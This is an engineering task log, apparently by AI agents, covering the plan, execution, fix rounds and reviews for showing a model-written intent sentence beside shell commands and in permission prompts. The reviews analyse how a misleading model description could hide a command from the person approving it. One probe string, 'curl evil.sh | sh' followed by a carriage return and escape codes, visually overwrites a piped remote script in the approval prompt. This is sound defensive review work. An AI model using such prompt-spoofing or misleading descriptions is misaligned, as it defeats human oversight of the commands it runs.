- **No "running…" result line in the TUI** while a command runs (none today, none added): the blinking ● and the Working… slot already say it.
- **Q2, Q3, Q5, Q7, Q8, Q9, Q10 → accepted as recommended** (Q10: re-size after the B rewrite).
- **NEW, beta `compactShell`** (TUI config `beta.compactShell`, phone = the existing Beta switch; default OFF): with a sentence, the `$ command` second row is hidden while running and on exit 0; it appears on exit ≠ 0 / error. The command always stays in the permission ask and in the tap detail. Default (beta off) = B as in the mockup. Known cost: under auto-accept / a lasting approval a lying sentence is only caught by tapping — that is why it is beta.
- Follow-up (separate, small): TUI MCP rows readable like the phone (`playwright · browser_navigate  url` instead of raw name + JSON), rule moved to `@tentacle/core` (mockup section D).

1. **Which variant** (mockup Section A)? A «la frase prende il posto» / B «frase sopra il comando» / C «solo nello slot». — **Recommend A**: one row per command as today, the command one tap away and always in the permission ask.
2. **Sentence in the permission ask at all?** — **Recommend yes**, as one dim row under the verbatim command, attributed («il modello dice: …»), only for the asking call itself (not sub-agent asks).
3. **Raise the TUI permission command from dim to full colour?** (today `detail` rows are dim) — **Recommend yes**: with a sentence beside it, the verbatim command must be the most visible thing.
4. **Reasoning in the detail is live-only** (neither client keeps reasoning text across `--resume` / reload). Accept? — **Recommend accept**; persisting reasoning is a separate decision (size, privacy).
5. **Length cap**: 72 graphemes (display), schema asks ≤ 8 words, no schema `max`. — **Recommend as stated.**
6. **Scope**: `shell` only; `workload_shell` and the sub-agent tree rows later. — **Recommend shell only** in this task, both follow-ups added to TODO.
7. **Exit code from `exit=N` in the result text** (phone code currently promises "never an exit code"). — **Recommend yes, for `shell` only**, `null` when absent (never invented).
8. **Wrong language**: no detection, shown as written. — **Recommend no detection** (the schema wording is the lever).
9. **Fill-rate acceptance**: ≥ 80 % on DeepSeek and Anthropic over the 20-prompt script; below that, one system-prompt line. — **Recommend yes.**
10. **Size**: L (11 files, 5 packages) vs the TODO's M; three slices on one branch. — **Recommend L, three slices, one branch**, fresh-context Review of the permission slice.
11. **Thinking spinner** (mockup Section B) — a SEPARATE task, not this branch. — **Recommend «2 · ∴ che ruota»** (∴ ↔ ∵ every 600 ms in TUI, the ∴ dots rotating in 2.4 s on the phone; static ∴ under reduce motion), conditional on the executor confirming `cells.ts` measures U+2234/2235 as 1 cell (East-Asian width "ambiguous"); else «1 · Pendolo» (pure braille).

## Execution

*— claude-opus-5-5, 2026-11-21*

**Load-bearing check** re-run first (Context repro, absolute imports from
`.tentacle/tmp/shell-intent-line/repro.ts`): output identical to the Context's —
the `description` reaches wire + client untouched, the schema strips it, no client
draws it. Holds.

**S1 — DONE.** `tools/src/builtins.ts:411-418` optional `description` (no `.max`)
+ "Always give `description`." in the tool text. `core/src/shell-intent.ts` (new,
exported `core/src/index.ts:31`): `shellIntent`, `shellCommand`, `shellExitCode`,
`shellOutcome`, `shellRowParts`, `permissionIntent`, `INTENT_MAX`. Config:
`schema.ts` `beta` section, `key-docs.ts` `beta` + `beta.compactShell`
(`carried: "no"`, default false), `defaults.ts` template comment.
Tests: `core/test/shell-intent.test.ts` (18), `tools/test/builtins.test.ts` (+2),
`config/test/beta-compact-shell.test.ts` (4), `key-docs.test.ts` CLI-default list.

**S2 — DONE.** `tui/src/render-lines.ts`: `shellIntentLines` (variant B) called
from `toolLines` before the queued/header path; today's body code moved into
`toolBodyRows` (behaviour-identical, proven by the byte-identical test);
`RenderOptions.compactShell` + `RowCacheEntry.compactShell` in the cache check.
Plumbing: `run.tsx` (`TuiOptions.compactShell`), `app-types.ts`, `App.tsx` (all
four RenderOptions sites + both deps lists — the warm/idle/layout sites must agree
or the cache thrashes), `cli/src/main.ts:1431, 2289`, `cli/src/connect.ts`
(`ConnectOptions.compactShell`, `connectCompactShell`). Tests:
`tui/test/shell-intent-rows.test.ts` (12), `tui/test/app-shell-intent.test.tsx`
(ink frame: sentence + `  $ cmd` while running, slot still `Working…`, no
`running…`, `✓` settled, `❯` input row at the same y before/after the result),
`cli/test/connect-compact-shell.test.ts` (2).

**S3 — STOPPED (plan contradicts the code).** See the ⚠ correction in Design §5:
the plan's client step fills `PermissionRequestOptions.toolCallId/origin` from the
wire, which `foreign-turns.test.ts:775-777` and the attribution Review pin as
never-from-the-wire. My router/remote-client edits were reverted (`git diff
packages/client` empty). Not built: `permissionView`, full-colour wrapped command,
the intent row (TUI and phone sheet). `permissionIntent` exists in core (pure,
tested) but has no caller yet. **Decision needed:** approve the `askedFor`
amendment (or another shape), then S3 runs as one slice.

**S4 — DONE except the phone permission sheet (S3).** `apps/mobile/src/tool-steps.ts`
`stepRowView(…, compact = false)`: `subline`, `shimmer`, sentence name, outcome in
`trailing` (`shellTrailing`), `shellA11yLabel` (sentence, status word, "exit code
N"). `ui/StepNode.tsx`: second mono line inside the same `Pressable`, `ThinkingWord`
when `shimmer`, the 45 % cap lifted when `subtitle === ""`. `compactShell` flows
`App.tsx` (`useShellRows`) → `SessionRoute` → `SessionScreen` → `CellData`
(`transcript-cell.ts`, in `sameCellData`) → `TranscriptCell` → `StepProps` →
`stepRowView`. Beta: `shell-rows-store.ts` + `shell-rows-expo.ts` (new),
`SettingsScreen.tsx` row `beta-compact-shell` + `shell-rows-error` banner.
`tool-summary.ts` comment updated. Changelog `changelog.d/shell-intent-line.added.md`
(describes rows + beta only — no ask claim, since S3 is not built).

**Drift from Implementation (and why).**
1. `config/src/resolve.ts` (`ResolvedConfig.beta` + pass-through) and
   `config/src/profile.ts` (`beta` merged per key) — not in the plan's file list,
   but `main.ts` reads the RESOLVED config, so without them `beta.compactShell`
   was silently dropped (proven by `beta-compact-shell.test.ts` resolve/profile cases).
   Gate fix: `config/src/load.ts` too — `TentacleConfig.beta` + its pass-through from
   the resolved config (`main.ts` reads `TentacleConfig`; tsc TS2339 without it).
2. A described running shell row drops today's `⎿ running…` body (see ⚠ in
   Preconditions) — the plan's "none today" was wrong; built to its tests.
3. New test files instead of appending to `render-lines.test.ts`/`tool-steps.test.ts`
   (`shell-intent-rows.test.ts`, `apps/mobile/test/shell-intent-step.test.ts`).
4. The byte-identical test builds `main`'s expected rows through `theme.*`
   (the harness palette differs from a standalone run), captured first from `main`
   in `.tentacle/tmp/shell-intent-line/snap.ts` — output identical after the change.
5. `CellData.compactShell` + `rowExtraData` (the phone's memoised cell would
   otherwise not re-project when the switch flips).

**Red before green / mutations** (each restored; restore verified by grep/diff):

| Target | Mutation | Result |
|---|---|---|
| tool schema | before the change | `shell advertises an optional description` RED |
| tool schema | `.string().max(80)` | `never rejects an over-long description` RED |
| core | drop ANSI + control strip | `ANSI escapes and controls never survive` RED |
| core | `o.text ?? o.spillHead` | `a spilled result reads the code from the spill head` RED |
| core | drop `status === "error"` | `compact: hidden … shown on failure/denial` RED |
| config | drop `beta` from schema | 3 of 4 `beta.compactShell` tests RED |
| TUI rows | shell branch disabled (= `main`) | 10 of 12 RED (the 2 byte-identical tests green, as intended) |
| TUI app | shell branch disabled | `a described shell call in the App` RED |
| TUI rows | `entry.compactShell === compact` → `true` | `same item compact then not compact` RED |
| TUI rows | outcome painted as `theme.success("")` (hue only) | ✓ / ✗ exit 2 / ✗ tests RED (SGR stripped) |
| phone store | drop the `v` check | `a newer version → OFF, write refused` RED |

**Unverified (one line each).**
- `apps/mobile/test/shell-intent-step.test.ts` + `transcript-cell.test.ts` not run
  here: this worktree has no `apps/mobile/node_modules`, so every mobile test that
  imports `@tentacle/core` fails to resolve (pre-existing — `tool-steps.test.ts`
  fails the same way); a temp symlink / preload needed approval. Verify: the gate's
  `bun test` (or `bun test apps/mobile/test/shell-intent-step.test.ts` after install).
- Typecheck not run (budget: gate only). Seams spot-checked (`TuiOptions`,
  `ToolResultSpill.head`, `ShellStatus` ⊇ both clients' statuses).
- StepNode layout on a device (two-line Pressable, the lifted 45 % cap) — the
  harness cannot see it; verify on the simulator.
- Measurement (fill rate on DeepSeek + Anthropic) NOT run: it sends prompts to
  external APIs with the owner's keys — needs the owner's go-ahead.

Narrow tests: 323 pass / 0 fail (core, tools, config, cli key-docs + connect, TUI
rows/render-lines/app-shell-intent/app-frames/idle-warm, client foreign-turns +
permission-router, phone shell-rows-store). `bunx biome check` on all touched
paths: clean.

### Fix round 1

*— claude-opus-5-5, 2026-11-21*

**R1 (HIGH, README table) — FIXED.** `bun run docs:config` → `README.md` +1 row
(`beta.compactShell`). `config/test/readme-config-table.test.ts` RED before (2 fail:
`:39`, `:48`), 8/8 after.

**R2 (MEDIUM, safety net) — PARTIAL.** Built the part of S3 that the `askedFor`
amendment does not touch (Design §5 ⚠: "everything else … unchanged"):
- `tui/src/permission-ui.ts` `permissionView(req, intent, columns)` →
  `{ detailRows, intentRow }`: a `shell` ask's command is wrapped by CELLS
  (`wrapCells`, graphemes) to `columns − 3`, each line kept, capped at
  `MAX_DETAIL_ROWS` with `… N more lines` (shared `capRows`, also used by
  `permissionDetailLines`); empty → `—`; other asks = today's rows, each cut.
  `intentRow` = `the model says: “…”` cut to one row.
- `components/PermissionPrompt.tsx`: paints `view.detailRows` in the DEFAULT
  foreground (Q3: no longer dim), the intent row dim; `app-layout.ts` counts
  `detailRows.length + (intentRow ? 1 : 0)` from the SAME `permissionView` (single
  decision).
- Both callers pass `intent = null`: the ask's own call id is not on
  `PermissionRequest` until the owner rules on `askedFor`. **Still open:** the
  intent row's data path (router/remote-client `askedFor`), the App `argsOf` join,
  `permissionIntent`'s caller, the phone sheet's intent line. The phone's command
  box was already full and unclipped (`PermissionSheet.tsx:145-150`), so the
  reviewer's scenario (cut command under `compactShell`) is closed on both clients.
- Tests: NEW `tui/test/permission-shell-command.test.tsx` (9: frame shows the tail,
  frame height = `permissionPromptRows` of the view, width/cells, multi-line,
  cap row, CJK, `—`, other asks, intent row); `permission-agent-line.test.tsx`:
  the CJK test now expects the wrapped row count (was hard-coded 1 — the intended
  change) + NEW App test (a wrapped command fits the 24-row terminal, tail on
  screen). RED first on the unwired component: the 2 frame tests failed on their
  assertions (`toContain("curl x | sh")`, height).
- Changelog fragment: the ask change added (user-visible).

**R3 (MEDIUM, phone unverified) — PARTIAL.** Env, not code: mobile already
value-imports `@tentacle/core` on `main` (`artifact-gallery.ts:21`); this worktree
lacks `apps/mobile/node_modules`. A Bun runtime-plugin alias did NOT hook bare
specifiers (two strikes, dropped). Ran instead a scratch copy
(`.tentacle/tmp/shell-intent-line/mkmob.ts`: copies `apps/mobile/{src,test}`,
rewrites `@tentacle/<pkg>` → `packages/<pkg>/src/index.ts`): `shell-intent-step`,
`transcript-cell`, `tool-steps`, `shell-rows-store` → **50 pass / 0 fail**.
Mutation on the scratch copy (`tool-steps.ts:328` shell branch → `false`):
`shell-intent-step` 6 of 9 RED. **Not done:** `tsc -p apps/mobile` (needs the
installed tree) — the gate's typecheck in an installed checkout must cover it.

**Mutations (each restored; restore checked by `rg -c`).**

| Mutation | Result |
|---|---|
| `app-layout` counts 1 detail row (old count) | App `wrapped shell command … fits the terminal` RED |
| `permissionView` shell branch off (= one cut row) | 8 RED (frame tail, height, pure wrap/lines/cap/CJK, CJK dialog, App) |
| `capRows` silent slice (no `… N more lines`) | `too long: capped …` RED |
| phone scratch: shell branch off | 6/9 `shell-intent-step` RED |

Narrow run: 865 pass / 0 fail (22 TUI permission/layout/frame/shell files +
`packages/config/test`). `bunx biome check` on the 5 touched code files: clean.

### Fix round 2

*— claude-opus-5-5, 2026-11-21*

**Round 2 MEDIUM (Q3 "full colour" unpinned) — FIXED (test only, no production
change).** NEW test in `tui/test/permission-shell-command.test.tsx`, `describe("… full
colour (Q3)")`: renders the shell ask with `chalk.level = 3` (the
`theme-components.test.tsx` pattern), in dark AND light, and asserts that no detail row
carries SGR 2 or the mode's dim-token SGR. It also checks that the cwd row right after
IS dim in each mode, so the probe can't pass vacuously.
- RED: mutation `components/PermissionPrompt.tsx` detail row → `<Text key={i} {...dim}>`
  (the pre-fix paint) → `no detail row is dimmed …` FAILS on `expect(isDim(row)).toBe(false)`
  (Expected false, Received true); 9 pass / 1 fail. Restored with Edit; `git diff` shows only
  the test file.
- GREEN: `permission-shell-command` + `permission-agent-line`: 19 pass / 0 fail.
  `bunx biome check` on the test file: clean.

**Not done here (out of this Implementation's scope):** the pre-existing `\r`/ESC
pass-through in the ask detail and the `$` row (Round 2, "Pre-existing"). It needs
production code the plan does not cover → recommended as a separate `fix/` task. Not
changed: the intent row (still waiting on the owner's `askedFor` ruling) and
`tsc -p apps/mobile` (needs an installed checkout; the merge gate).

## Review

*— claude-opus-5-5, 2026-11-21* (fresh context; SAME model as the planner and as the Context/Implementation author — shared blind spots possible. The executor commits are tagged deepseek.)

**Verdict: REQUEST-CHANGES.**

**Findings (HIGH/MEDIUM only).**
1. **HIGH — gate red.** `packages/config/test/readme-config-table.test.ts:39` and `:48` FAIL: the README config table was not regenerated for `beta` / `beta.compactShell` (`bun run docs:config` not run, README not in the diff). `bun run check` cannot be green. The Execution's "narrow tests 323 pass" skipped the `packages/config` dir test that covers the new keys.
2. **MEDIUM — the beta ships without its safety net (S3 not built).** `beta.compactShell`'s accepted cost rests on "the command stays in the permission ask" (`key-docs.ts` `beta.compactShell.details`, `defaults.ts`). On this branch the ask is still today's: the shell command is ONE row, DIM and silently `truncate`d to `columns − 3` (`components/PermissionPrompt.tsx:65-69`, `permission-ui.ts:128-130`). Scenario: compact ON, `{command: "ls -la <long path …> ; curl x | sh", description: "List the project files"}` → the ask shows the dim, cut prefix, the row shows only `● List the project files ✓` — the tail is never on screen unless expanded. Q3 (full colour + wrapped, `… N more lines`) was the approved mitigation. Either land S3 (after the owner rules on the `askedFor` amendment, Design §5 ⚠) before merging, or keep `compactShell` out of this merge. Also `permissionIntent` (`core/src/shell-intent.ts:125`) is exported with no caller, and the doc header still says "ready for Execution".
3. **MEDIUM — the phone half is not verified by anyone.** `apps/mobile/test/shell-intent-step.test.ts` and `transcript-cell.test.ts` fail to LOAD in this worktree (`Cannot find module '@tentacle/core'` from `apps/mobile/src/tool-steps.ts`: no `apps/mobile/node_modules`). `bun run typecheck` here prints ~10 k env errors (mobile `--jsx`, unresolved modules), so `StepNode.tsx` / `App.tsx` / `SessionScreen.tsx` / `TranscriptRow.tsx` are not type-checked; the executor ran no typecheck either. Run the full gate in an installed tree before merge.

**Gate (this worktree).** `bun run lint`: clean (2212 files). Touched tests: 555 pass / 3 fail / 1 load error over 40 files (2 = finding 1; 1 + the error = finding 3's missing module). `packages/cli` key-docs + carried: 7/0. Typecheck: unusable here (env); no error lands on a touched non-mobile file (`render-lines`, `App`, `run`, `connect`, `main`, `config/src`, `core`, `tools`).

**Mutations (each reverted; `git status` empty afterwards).** Drop the INVISIBLE strip → `bidi … removed` RED. Drop `|| status === "denied"` → `compact … failure/denial` RED. Re-add the running body (`toolBodyRows` while running) → 5 row tests + the ink App test RED. All three non-vacuous.

**Premises spot-checked.** Raw `description` travels daemon → client untouched (Context repro): TRUE per the executor's re-run (not re-run by me). Permission detail one dim truncated row (`PermissionPrompt.tsx:65-69`): TRUE. `fitSubtitle` flattens newlines/tabs and returns `""` at budget ≤ 0 (`tool-expand.ts:106-113`): TRUE — the `$` row's command handling is no weaker than today's subtitle.

**Attacks tried.** (a) Control/ANSI/bidi in `description` → stripped in core before either client (holds; pinned). (b) Cache poisoning compact vs non-compact → `compactShell` in the `itemRows` key + all four App opts sites and both deps lists (holds). (c) Pod-supplied sentence feeding a decision → no permission/approval code reads it; `packages/client` untouched, so the never-from-the-wire attribution invariant (`foreign-turns.test.ts:775-777`) is intact (holds). (d) Silent drop of `beta` through resolve/profile/load → fixed by the drift edits, tested (holds). (e) Compact + truncated ask → finding 2.

**Executor behaviour.** Correctly STOPPED S3 when the plan collided with a pinned invariant and wrote the amendment instead of forcing it; mutation table honest. But it reported done-ish with the gate unrun (README test, typecheck), and the mobile tests never executed.

### Round 2

*— claude-opus-5-5, 2026-11-21* (fresh context; scope: `git diff HEAD~1` = `93b2076a`)

**Verdict: REQUEST-CHANGES** (one small test gap; everything else holds).

- **R1 (README) — FIXED.** `readme-config-table.test.ts` 8/8. Mutation (drop the `beta.compactShell` README row) → 2 RED; restored.
- **R2 (ask safety net) — FIXED for the scenario, one property unpinned.** `permissionView` wraps a shell command by cells, keeps its lines, caps with `… N more lines`; layout and paint read the same view. Mutation `app-layout.ts` count → `1` → the App "fits the terminal" test RED. **NEW MEDIUM (§9):** the Q3 "full colour, no longer dim" change (`components/PermissionPrompt.tsx:67-68`) is pinned by NO test — the mutation `<Text key={i} {...dim}>` leaves all 64 permission tests green. The plan's Tests asked for exactly that check ("Detail rows not dim (assert on the element props)"). Add it. The intent row stays unbuilt pending the owner's `askedFor` ruling — correctly marked PARTIAL, not a defect.
- **R3 (phone verified) — ACCEPTED as partial.** Scratch-copy run 50/0 + mutation reported. `tsc -p apps/mobile` is still unverified: this worktree's `bun run typecheck` gives 10 201 errors (env: no installed tree). On the touched files I found only cascades from the unresolved `@tentacle/core` (TS2307/TS1286, implicit-any on core types). The merge gate MUST run in an installed checkout.
- **Gate here:** `bun run lint` clean (2213 files); TUI permission tests 64/0.
- **Pre-existing (NOT this diff, flagged because R2 makes the ask the safety net):** the ask's detail is the pod's raw `explanation` (`client/src/permission-router.ts:107`), and a `\r` survives into the frame. Probe: detail `"curl evil.sh | sh\rls -la             \u001b[2Kecho ok"` → frame row `curl evil.sh | sh\rls -la`, so on a real terminal the CR moves the cursor back and `ls -la` overwrites the visible command. The `ESC[2K…` tail also vanished from the frame. The same applies to the transcript `$` row (`fitSubtitle` keeps `\r`). Recommend a `fix/` task: render control chars in the ask visibly (e.g. `␍`, `\x1b` → `␛`), never pass them to the terminal.
- **Executor behaviour:** honest PARTIAL labels, red-first shown, mutations real; it missed the one Q3 assertion the plan named.

